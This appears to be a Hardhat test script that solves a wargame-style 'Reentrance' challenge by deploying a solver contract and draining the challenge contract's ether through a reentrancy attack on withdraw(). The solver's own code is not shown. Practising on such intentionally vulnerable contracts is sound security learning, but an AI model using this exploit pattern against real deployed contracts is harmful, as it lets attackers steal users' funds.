import { expect } from "chai";
import { BigNumber, Contract, ContractFactory, providers, Signer } from "ethers";
import { ethers } from "hardhat";

describe("Reentrancy", function () {
    let signer: Signer;
    let myAddress: string;
    let challenge_instance_address = "0x5E72ff10cE7b197d916FE30cd32770BcfBA6B76f";
    let challengeFactory: ContractFactory;
    let challenge: Contract;

    before(async () => {
        [signer] = await ethers.getSigners();
        myAddress = await signer.getAddress();
        console.log("Primary Signer Address:", myAddress);
        challengeFactory = await ethers.getContractFactory("Reentrance");
        challenge = challengeFactory.attach(challenge_instance_address);
    });

    it("Should solve the challenge", async () => {
        // The contract already has 0.001 ether.
        // We can exploit a reentrancy attack on the withdraw() function
        // By sending two withdraw requests of 0.001 consecutively, we can 
        // validate our balance of >= 0.001 twice and thus withdraw the amount twice.
        const solverFactory = await ethers.getContractFactory("ReentrancySolver");
        const solver = await solverFactory.deploy(challenge.address);
        console.log("Solver contract address: ", solver.address);
        const depositTx = await challenge.donate(solver.address, {
            value: ethers.utils.parseUnits("0.001", "ether"),
            gasLimit: 100000
        });
        await depositTx.wait();

        console.log("Donated() 0.001 ether to solver");

        const solverTx = await solver.solve();
        await solverTx.wait();
        
        const challengeBalance = await signer.provider?.getBalance(challenge.address);
        expect(challengeBalance?.toNumber()).to.equal(0);
    });
});
